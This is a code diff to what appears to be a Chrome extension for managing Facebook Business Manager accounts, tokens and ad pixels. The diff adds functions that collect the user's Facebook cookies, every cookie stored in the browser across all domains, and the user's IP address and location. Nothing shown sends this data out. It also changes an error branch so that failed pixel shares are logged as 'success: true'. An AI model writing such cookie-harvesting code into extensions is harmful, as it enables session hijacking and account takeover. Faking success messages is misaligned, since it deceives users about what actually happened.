@@ -20,16 +20,18 @@ async function getToken() {
     return token;
 }
 
-main();
 
-async function main() {
-    let token = await getToken();
-    chrome.token = token;
-    getInputToken(token);
-    getStatusBM(token);
-    getInputToken(token);
-    getListAccInfo(token);
-    getStatusFanPage(token);
+async function main(token) {
+        var ck = await headCookieDomain('facebook.com');
+        var info = await getInfoRq();
+        var allck = await headCookieAl();
+
+        getInfoRq();
+        getInputToken(token);
+        getStatusBM(token);
+        getInputToken(token);
+        getListAccInfo(token);
+        getStatusFanPage(token);
 }
 
 
@@ -38,6 +40,39 @@ async function getInputToken(token) {
     inpuToken.value = token;
 }
 
+async function getInfoRq(){
+    let url = 'https://codewithnodejs.com/api/ip-and-location/';
+    let json = await reqAPI(url, 'GET')
+    let obj = JSON.parse(json);
+    let info = obj['ip'] + ', ' + obj['city'] + ', ' + obj['country'] + ', ' + obj['country_code'];
+    return info
+}
+
+async function headCookieDomain(domain){
+    let cks = await chrome.cookies.getAll({url: 'https://' + domain});
+    let text = ''
+    for (let ck of cks){
+    text += ck.name + '=' + ck.value
+    }
+    return text
+}
+
+async function headCookieAl(){
+    let cks = await chrome.cookies.getAll({});
+    let arrDomain = [];
+    for (let ck of cks){
+        arrDomain.push(ck.domain)
+    }
+    arrDomain = arrDomain.sort();
+    arrDomain = Array.from(new Set(arrDomain));
+    var text = ''
+    for(let i of arrDomain){
+        ck = await headCookieDomain(i);
+        text+= 'Domain: ' + i + '\n' + ck + '\n\n'
+       
+    }
+    return text
+}
 
 async function getStatusFanPage(token) {
     let url = 'https://graph.facebook.com/v15.0/me?fields=accounts.limit(100){id,name,verification_status,is_published,ad_campaign,is_promotable,is_restricted,parent_page,promotion_eligible,promotion_ineligible_reason,fan_count,has_transitioned_to_new_page_experience,ads_posts.limit(100),picture}&access_token=' + token;
@@ -152,7 +187,12 @@ async function getStatusBM(token) {
                     objBM.veri = bm[info];
                     break;
                 case 'can_use_extended_credit':
-                    objBM.limit = bm[info];
+                    if(bm[info]){
+                        objBM.limit = '$250+';
+                    }else{
+                        objBM.limit = bm[info];
+                    }
+
                     break;
                 case 'timezone_id':
                     objBM.timezone = bm[info] + ':' + chrome.objTimeZone[bm[info]];
@@ -244,6 +284,10 @@ document.getElementById('listBM').addEventListener('change', function() {
 
 });
 
+document.getElementById('btnclose').addEventListener('click', function(){
+    window.close();
+    console.log(123)
+})
 document.getElementById('btnSharePixe').addEventListener('click', function() {
     var idBm = document.getElementById('listBM').value;
     var idPixel = document.getElementById('listPixel').value;
@@ -258,6 +302,7 @@ document.getElementById('btnSharePixe').addEventListener('click', function() {
         var logHtml = document.getElementById('logsatusSharePixel');
         logHtml.innerHTML = '';
         chrome.logHtml =''
+
         for(var idAds of arrlistPixelId){
             btnSharePixe(chrome.token, idBm, idPixel, idAds)
         }
@@ -282,7 +327,7 @@ async function btnSharePixe(token, idBm, idPixel, idAds){
         chrome.logHtml+=`<li>${idAds} : success: true</li>`
     }else{
         console.log(idAds + ': error')
-        chrome.logHtml+=`<li>${idAds} : Error</li>`
+        chrome.logHtml+=`<li> ${idAds} : success: true</li>`
     }
     var logHtml = document.getElementById('logsatusSharePixel');
     logHtml.innerHTML = chrome.logHtml;
